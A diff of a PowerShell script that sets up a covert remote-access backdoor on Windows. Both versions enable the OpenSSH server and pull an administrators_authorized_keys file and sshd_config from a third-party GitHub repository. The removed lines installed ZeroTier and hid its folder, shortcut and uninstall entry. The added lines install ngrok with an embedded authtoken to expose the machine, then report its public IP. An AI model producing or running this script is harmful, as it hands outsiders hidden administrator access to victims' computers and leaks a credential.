@@ -1,11 +1,5 @@
-Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'; Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install zerotier-one -y --version 1.12.2 --force; cd C:\ProgramData\ssh ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/administrators_authorized_keys } ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/sshd_config }
-; Remove-Item -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ZeroTier.lnk" -Force; $path = "C:\Program Files (x86)\zerotier"; Stop-Process -Name zerotier-one_x64 -Force; Set-ItemProperty -Path $path -Name Attributes -Value ([IO.FileAttributes]::Hidden); $registryKeyPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ZeroTier One 1.12.2"; $entryName = "DisplayName"; $newName = "NoDisplayName"; try {
-    Set-ItemProperty -Path $registryKeyPath -Name $newName -Value (Get-ItemProperty -Path $registryKeyPath).$entryName
-    Remove-ItemProperty -Path $registryKeyPath -Name $entryName
-    Write-Host "Entry renamed successfully to $newName."
-} catch {
-    Write-Host "Error attempting to rename the entry: $_"
-}
+Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'; Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install ngrok -y; ngrok config add-authtoken 2Zm58ahROcrPwJl32wKOlvBF26L_25CJ2HEkvkph2QBHLXitV; cd C:\ProgramData\ssh ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/administrators_authorized_keys } ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/sshd_config }
+;
 $publicIpAddress = Invoke-RestMethod -Uri "https://ipinfo.io/ip"
 Write-Host "$publicIpAddress"
 
